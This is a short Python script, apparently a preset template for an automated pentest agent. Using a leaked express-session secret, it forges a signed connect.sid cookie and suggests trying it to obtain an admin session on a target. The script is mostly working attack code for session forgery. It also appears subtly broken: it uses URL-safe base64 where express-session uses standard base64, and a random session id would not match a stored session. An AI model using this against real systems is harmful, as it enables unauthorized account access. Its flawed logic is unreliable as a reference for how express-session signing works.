#!/usr/bin/env python3
"""
Free-attack 预置模板：express-session 会话伪造验证（只读）

用法:
    python session-forge.py -u <target-url>

环境变量:
    PENTEST_FA_SESSION_SECRET   express-session 密钥（必填）
    PENTEST_FA_SESSION_ID       可选，指定 session id（默认随机）

行为:
    - 用泄露的密钥对随机 session id 计算 express-session 的签名 cookie
    - 输出 connect.sid 值；agent 用 pentest_http 带 Cookie: connect.sid=<值>
      验证是否伪造出有效管理员会话（登录态接口 2xx = 伪造成功）
    - 纯本地计算，不向目标发包
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import secrets
import sys

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    args = parser.parse_args()
    secret = os.environ.get("PENTEST_FA_SESSION_SECRET", "").strip()
    if not secret:
        print(json.dumps({"ok": False, "reason": "missing PENTEST_FA_SESSION_SECRET env"}, ensure_ascii=False))
        return 2
    session_id = os.environ.get("PENTEST_FA_SESSION_ID", "").strip() or secrets.token_urlsafe(24)
    # express-session default cookie signature: base64url(hmac-sha256(secret, sessionId))
    digest = hmac.new(secret.encode(), session_id.encode(), hashlib.sha256).digest()
    signature = base64.urlsafe_b64encode(digest).decode().rstrip("=")
    cookie_value = f"s:{session_id}.{signature}"
    print(json.dumps({
        "ok": True,
        "cookie": cookie_value,
        "sessionId": session_id,
        "signature": signature,
        "hint": "Use with: pentest_http --header 'Cookie: connect.sid=' + cookie",
    }, ensure_ascii=False))
    return 0

if __name__ == "__main__":
    sys.exit(main())
